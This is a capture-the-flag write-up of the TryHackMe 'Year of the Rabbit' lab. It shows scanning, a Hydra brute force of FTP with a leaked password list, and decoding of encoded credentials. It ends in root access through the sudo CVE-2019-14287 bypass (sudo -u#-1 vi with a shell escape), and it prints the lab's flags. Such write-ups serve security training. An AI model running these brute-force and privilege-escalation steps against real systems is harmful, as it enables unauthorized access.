## Year of th Rabbit - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/yearoftherabbit)

<i>Let's have a nice gentle start to the New Year!
Can you hack into the Year of the Rabbit box without falling down a hole?

(Please ensure your volume is turned up!)</i>

**IP: 10.10.78.65**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Brute Force <br>

**Tools Used**: Nmap, Gobuster, Burp Suite, Hydra<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- As always, starting with Nmap and Gobuster.

  ```
  nmap -sC -sV -T5 -p- 10.10.78.65

  PORT   STATE SERVICE VERSION
  21/tcp open  ftp     vsftpd 3.0.2
  22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
  | ssh-hostkey: 
  |   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
  |   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
  |   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
  |_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
  80/tcp open  http    Apache httpd 2.4.10 ((Debian))
  |_http-server-header: Apache/2.4.10 (Debian)
  |_http-title: Apache2 Debian Default Page: It works
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  gobuster dir -u http://10.10.78.65/ -w /usr/share/wordlists/dirb/common.txt 

  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 276]
  /.htpasswd            (Status: 403) [Size: 276]
  /.htaccess            (Status: 403) [Size: 276]
  /assets               (Status: 301) [Size: 311] [--> http://10.10.78.65/assets/]
  /index.html           (Status: 200) [Size: 7853]
  /server-status        (Status: 403) [Size: 276]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- After visiting `http://10.10.78.65/assets`, I found `style.css` which contains hidden message and of course [THE CLASSIC](https://www.youtube.com/watch?v=dQw4w9WgXcQ).

  ```
  http://10.10.78.65/assets/style.css 

  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  ```
  
- YOU MUST LISTEN TO THE CLASSIC IN ORDER TO HEAR ANOTHER HIDDEN MESSAGE AHAAHAHAHAHAHAHAH

- Jokes aside, when you go to `/sup3r_s3cr3t_fl4g.php` it will ask you to turn off JavaScript, so I did it and got [THE CLASSIC](https://www.youtube.com/watch?v=dQw4w9WgXcQ) again. That wasn't helpful so I switched to Burp.

- After intercepting the request to `http://10.10.78.65/sup3r_s3cr3t_fl4g.php` I found a hidden directory.

  ```
  REQUEST:
  GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
  Host: 10.10.78.65
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  RESPONSE:
  HTTP/1.1 302 Found
  Date: Thu, 08 May 2025 18:56:39 GMT
  Server: Apache/2.4.10 (Debian)
  Location: intermediary.php?hidden_directory=/WExYY2Cv-qU
  Content-Length: 0
  Keep-Alive: timeout=5, max=100
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8
  ```

- OK, nice, let's see what's inside. Yep, hot babe waiting for me. I downloaded the image and used `steghide` on it but got nothing, thankfully `binwalk` did the job.

  ```
  binwalk Hot_Babe.png               

  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  0             0x0             PNG image, 512 x 512, 8-bit/color RGB, non-interlaced
  54            0x36            Zlib compressed data, best compression
  
  binwalk -e Hot_Babe.png           
  
  DECIMAL       HEXADECIMAL     DESCRIPTION
  --------------------------------------------------------------------------------
  54            0x36            Zlib compressed data, best compression
  
  WARNING: One or more files failed to extract: either no utility was found or it's unimplemented
  
  cd _Hot_Babe.png.extracted
  
  cat 36.zlib
  [SNIP!]
  Eh, you've earned this. Username for FTP is ftpuser
  One of these is the password:
  Mou+56n%QK8sr
  1618B0AUshw1M
  A56IpIl%1s02u
  vTFbDzX9&Nmu?
  FfF~sfu^UQZmT
  8FF?iKO27b~V0
  ua4W~2-@y7dE$
  3j39aMQQ7xFXT
  [SNIP!]
  u6oY9?nHv84D&
  0iBp4W69Gr_Yf
  TS*%miyPsGV54
  C77O3FIy0c0sd
  O14xEhgg0Hxz1
  5dpv#Pr$wqH7F
  1G8Ucoce1+gS5
  0plnI%f0~Jw71
  ```

- Awesome! Copy the full list of passwords and brute force your way into FTP.

  ```
  hydra -l ftpuser -P pwlist.txt ftp://10.10.78.65
  Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
  
  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-08 20:04:33
  [DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
  [DATA] attacking ftp://10.10.78.65:21/
  [21][ftp] host: 10.10.78.65   login: ftpuser   password: 5iez1wGXKfPKQ
  1 of 1 target successfully completed, 1 valid password found
  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-08 20:04:47
  ```

- Since we have credentials, we can login with FTP. There I found a file `Eli's_Creds.txt` and moved it to my Kali.

  ```
  ftp 10.10.78.65
  Connected to 10.10.78.65.
  220 (vsFTPd 3.0.2)
  Name (10.10.78.65): ftpuser
  331 Please specify the password.
  Password: 
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
  ftp> ls
  229 Entering Extended Passive Mode (|||20783|).
  150 Here comes the directory listing.
  -rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
  226 Directory send OK.
  ftp> pwd
  Remote directory: /
  ftp> get Eli's_Creds.txt
  local: Eli's_Creds.txt remote: Eli's_Creds.txt
  229 Entering Extended Passive Mode (|||11090|).
  150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
  100% |************************************************************************|   758        1.82 MiB/s    00:00 ETA
  226 Transfer complete.
  758 bytes received in 00:00 (14.04 KiB/s)
  ftp> 
  ```

- Let's check the credentials now. Yep, its encoded, use Cipher Identifier to decode the string and get valid credentials. Yeah, that's a legit name of cipher, I know...

  ```
  cat Eli\'s_Creds.txt 
  +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
  --<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
  ++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
  +++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
  ]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
  ++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
  --<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
  +<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
  ++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
  <]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
  <]>+. <+++[ ->--- <]>-- ---.- ----. <
  
  User: eli
  
  Password: DSpDiM1wAEwid
  ```

- Now let's do SSH and get those flags!
  
---

## 🧍 User Privilege Escalation

- When you login, you'll see the message from root.

  ```
  1 new message
  Message from Root to Gwendoline:
  
  "Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
  
  END MESSAGE
  ```
  
- OK, that's a good sign. I also looked for a flag and found it in `/home/gwendoline` but couldn't read it.

  ```
  eli@year-of-the-rabbit:/home$ cd gwendoline
  
  eli@year-of-the-rabbit:/home/gwendoline$ ls
  user.txt
  
  eli@year-of-the-rabbit:/home/gwendoline$ cat user.txt 
  cat: user.txt: Permission denied
  ```
  
- Now, let's deal with that secret message. Find the directory, go there and you'll see Gwendoline's credentials. Read the file, switch users to Gwendoline and read the user flag.

  ```
  eli@year-of-the-rabbit:/home/gwendoline$ find / -name s3cr3t 2>/dev/null
  /usr/games/s3cr3t
  
  eli@year-of-the-rabbit:/home/gwendoline$ ls -al /usr/games/s3cr3t/
  total 12
  drwxr-xr-x 2 root root 4096 Jan 23  2020 .
  drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
  -rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
  
  eli@year-of-the-rabbit:/home/gwendoline$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
  Your password is awful, Gwendoline. 
  It should be at least 60 characters long! Not just MniVCQVhQHUNI
  Honestly!
  
  Yours sincerely
     -Root
  
  eli@year-of-the-rabbit:/home/gwendoline$ su gwendoline
  Password:
   
  gwendoline@year-of-the-rabbit:~$ whoami
  gwendoline
  
  gwendoline@year-of-the-rabbit:~$ id
  uid=1001(gwendoline) gid=1001(gwendoline) groups=1001(gwendoline)
  
  gwendoline@year-of-the-rabbit:~$ ls
  user.txt
  
  gwendoline@year-of-the-rabbit:~$ cat user.txt 
  THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
  ```

- First flag obtained, escalation here I come!

---

## 👑 Root Privilege Escalation

- Honestly, this one wasn't that hard I guess since `sudo -l` did 98% of the job.

  ```
  gwendoline@year-of-the-rabbit:~$ sudo -l
  Matching Defaults entries for gwendoline on year-of-the-rabbit:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
  
  User gwendoline may run the following commands on year-of-the-rabbit:
      (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
  ```
  
- I found exploit on GTFOBins, used it and unfortunately it didn't work. If you try `sudo /usr/bin/vi /root/root.txt` or exploit from GTFOBins, you'll just get denied. When it comes to sudo, I used one exploit few days ago that will bypass that restriction.
  You can find the exploit [here](https://www.exploit-db.com/exploits/47502). So with this exploitation, instead of using `sudo` we are gonna use `sudo -u#-1` on the command and file that we found with `sudo -l`.
  The thing is, it doesn't matter on which file we use it as long as we have permission to write to that file, you can create an empty new file and use the command on it, the important part is to type `:!/bin/sh` in the file followed by `Enter` button and that's it, you'll have a root after that.

  ```
  sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

  :!/bin/sh
  
  # whoami
  root
  # id
  uid=0(root) gid=0(root) groups=0(root)
  # cat /root/root.txt
  THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
  ```

- You can find more details about this vulnerability [here](https://www.mend.io/blog/new-vulnerability-in-sudo-cve-2019-14287/). You can use that command with various other different commands in order to escalate privileges since it is a `sudo` vulnerability, it's not strictly related to `vim`.

- I had so much fun with this challenge — loved it! Thank you, MuirlandOracle! 👑


---

## 🏁 Flags

- **User Flag**: `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}`
- **Root Flag**: `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Nothing much, just sharpening my skillzzzz.`

- What did I learn?
  `Nothing new, maybe escalating with VIM but that wasn't really new to me.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
